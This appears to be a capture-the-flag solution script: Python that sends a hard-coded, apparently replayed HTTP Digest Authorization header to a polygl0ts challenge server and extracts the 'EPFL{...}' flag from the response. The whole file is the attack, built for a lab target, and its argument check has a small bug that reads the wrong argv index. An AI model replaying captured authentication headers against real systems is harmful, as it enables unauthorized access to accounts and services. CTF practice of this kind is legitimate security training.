import requests
import re
import sys

if len(sys.argv) >= 2:
  remote = sys.argv[2]
else:
  remote = "http://chall.polygl0ts.ch:9009"

print("trying against "+remote)

res = requests.get(remote,headers={'Authorization':'Digest username="asd", realm="Restricted Area", nonce="8da1c5b48649a53c77899477a36f4733", uri="/", response="c8ca4b2ad2bc81a82102ae9a6953422c", opaque="de7d27e200c0609db205b9a5900564b9", qop=auth, nc=00000002, cnonce="50d29b9cc4d04bc8"'}).text

match = re.search(r"EPFL{.*}", res)[0]

print(match)
